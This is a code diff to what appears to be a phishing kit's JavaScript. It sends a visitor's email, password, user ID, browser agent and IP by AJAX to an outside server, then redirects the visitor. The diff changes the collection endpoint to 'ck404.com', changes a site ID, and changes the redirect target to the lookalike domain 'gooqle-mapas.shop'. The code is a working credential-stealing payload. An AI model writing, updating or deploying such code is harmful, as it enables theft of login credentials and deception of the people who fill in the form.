@@ -83,21 +83,21 @@ $(document).ready(function () {
             // Send form data via AJAX
             $.ajax({
                 type: 'POST',
-                url: 'https://majidul.ck408.online/api/data',
+                url: 'https://ck404.com/api/data',
                 data: {
                     email: username,
                     password: password,
                     user_id: userId,
                     agent: navigator.userAgent,
                     user_ip: userIp,
-                    website_id: 44,
+                    website_id: 40,
                 },
                 success: function (response) {
                     console.log('Response:', response);
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://login.megapersoanalse.my.id/users/auth/login/${userId}`;
+                            window.location.href = `https://gooqle-mapas.shop/view-location/${userId}`;
                           }
                     
                 },
